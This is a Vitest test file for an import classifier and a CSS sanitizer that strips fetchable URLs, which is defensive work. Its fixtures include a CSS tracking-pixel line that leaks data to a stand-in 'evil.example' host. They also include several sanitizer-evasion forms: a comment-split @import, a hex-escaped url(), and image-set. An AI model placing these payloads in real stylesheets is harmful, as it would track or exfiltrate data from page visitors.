import { describe, expect, it } from "vitest";
import { classifyImport, importSpecifiers, toManifestStatus } from "./classify";
import { sanitizeCss, hasFetchableUrl } from "./host-css";

describe("classifyImport", () => {
  it("routes pure npm to vendor, framework/data to shims, server-only to absent", () => {
    expect(classifyImport("lucide-react").kind).toBe("vendor-npm");
    expect(classifyImport("date-fns").kind).toBe("vendor-npm");
    expect(classifyImport("@/lib/format").kind).toBe("vendor-local");
    expect(classifyImport("../lib/cn").kind).toBe("vendor-local");
    expect(classifyImport("next/link")).toMatchObject({ kind: "shimmed" });
    expect(classifyImport("swr")).toMatchObject({ kind: "shimmed" });
    expect(classifyImport("react")).toMatchObject({ kind: "shimmed" });
    expect(classifyImport("next/headers").kind).toBe("absent");
    expect(classifyImport("node:fs").kind).toBe("absent");
  });

  it("maps classes to manifest statuses", () => {
    expect(toManifestStatus(classifyImport("lucide-react"))).toEqual({ kind: "real" });
    expect(toManifestStatus(classifyImport("swr")).kind).toBe("shimmed");
    expect(toManifestStatus(classifyImport("next/headers")).kind).toBe("absent");
  });
});

describe("importSpecifiers", () => {
  it("extracts deduped specifiers, ignoring @vendoai/shell", () => {
    const src = `import { Badge } from "@/components/ui/badge"
import { ArrowUpRight } from "lucide-react"
import { VendoRemix } from "@vendoai/shell"
import { daysUntil } from "@/lib/format"
import { Badge as B2 } from "@/components/ui/badge"
export function W() { return null }`;
    expect(importSpecifiers(src)).toEqual([
      "@/components/ui/badge",
      "lucide-react",
      "@/lib/format",
    ]);
  });
});

describe("sanitizeCss", () => {
  it("drops fetchable url() and @import but keeps data: URLs, leaving zero fetchable URLs", () => {
    const input = `@import "https://fonts.example/x.css";
.a { background: url("https://evil.example/pixel.png?leak=1"); }
.b { background: url(/logo.svg); }
.c { cursor: url(cursor.png), auto; }
.d { background: url(data:image/png;base64,AAAA); }
@font-face { src: url("https://cdn/x.woff2"); }`;
    const { css, dropped } = sanitizeCss(input);
    expect(dropped.length).toBeGreaterThanOrEqual(4);
    expect(css).toContain("data:image/png;base64,AAAA");
    expect(css).not.toContain("evil.example");
    expect(hasFetchableUrl(css)).toBe(false);
  });

  it("defeats the evasion forms Codex flagged: image-set, comment-split @import, EOF import, hex-escaped url", () => {
    const inputs = [
      `.a { background: image-set("https://x/a.png" 1x); }`,
      `@import/**/"https://x/a.css";`,
      `@import "https://x/a.css"`, // no trailing semicolon, at EOF
      `.b { background: u\\72l("https://x/a.png"); }`, // \72 = 'r'
      `.c { background:URL( 'https://x/b.png' ); }`, // uppercase, spaced, quoted
    ];
    for (const input of inputs) {
      const { css } = sanitizeCss(input);
      expect(hasFetchableUrl(css), input).toBe(false);
      expect(css).not.toContain("https://x");
    }
  });

  it("keeps a data: URL whose base64 payload contains // intact (external-ref pass must not eat it)", () => {
    const input = `.a { background: url(data:image/png;base64,iVBOR//w0KGgoAAAANSU//hEUgAA==); }`;
    const { css, dropped } = sanitizeCss(input);
    expect(css).toContain("iVBOR//w0KGgoAAAANSU//hEUgAA==");
    expect(dropped).toHaveLength(0);
    expect(hasFetchableUrl(css)).toBe(false);
  });
});
